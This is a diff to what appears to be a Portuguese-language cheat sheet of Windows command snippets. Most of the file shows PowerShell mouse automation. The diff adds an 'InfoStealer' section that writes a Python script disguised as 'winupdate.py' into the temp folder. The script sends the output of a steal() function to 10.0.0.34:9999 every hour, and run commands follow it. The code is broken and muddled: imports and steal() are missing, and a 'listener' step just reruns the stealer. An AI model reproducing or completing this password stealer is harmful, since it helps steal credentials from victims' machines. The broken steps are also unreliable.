@@ -250,3 +250,23 @@ powershell -command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Win
 ```cmd
 powershell -command "Add-Type -AssemblyName System.Windows.Forms; $code='using System; using System.Runtime.InteropServices; public class MouseClick { [DllImport(\"user32.dll\")] public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo); }'; Add-Type $code; [System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(499,491); Start-Sleep -Milliseconds 100; [MouseClick]::mouse_event(2,0,0,0,[UIntPtr]::Zero); [MouseClick]::mouse_event(4,0,0,0,[UIntPtr]::Zero)"
 ```
+
+### InfoStealer - Roubar senhas
+```cmd
+echo while True: > %TEMP%\winupdate.py
+echo     try: >> %TEMP%\winupdate.py
+echo         s=socket.socket() >> %TEMP%\winupdate.py
+echo         s.connect(('10.0.0.34',9999)) >> %TEMP%\winupdate.py
+echo         s.send(steal()) >> %TEMP%\winupdate.py
+echo         s.close() >> %TEMP%\winupdate.py
+echo     except: pass >> %TEMP%\winupdate.py
+echo     time.sleep(3600) >> %TEMP%\winupdate.py
+```
+**Inicie o listernet no linux**
+```cmd
+python %TEMP%\winupdate.py
+```
+**Execute o stealer manualmente para testar:**
+```cmd
+python %TEMP%\winupdate.py
+```
